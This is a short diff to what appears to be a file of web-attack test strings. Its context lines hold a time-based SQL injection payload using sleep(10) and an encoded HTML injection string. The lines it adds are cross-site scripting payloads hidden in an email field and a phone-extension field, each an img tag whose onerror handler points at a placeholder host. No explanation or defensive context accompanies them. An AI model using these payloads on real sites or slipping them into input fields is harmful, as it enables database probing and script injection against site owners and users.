@@ -42,3 +42,6 @@ desc%2c(select*from(select(sleep(10)))a)
 
 
 <h1>testiv%3ch1%3e%3cu%3e%3cimg%3eng</h1>%26lt;h1%26gt;test<img>
+
+email: "><img/src/onerror=('//domain/')>"domain.com
+mobile: 012341332;ext=<img/src/onerror=('//domain/')>
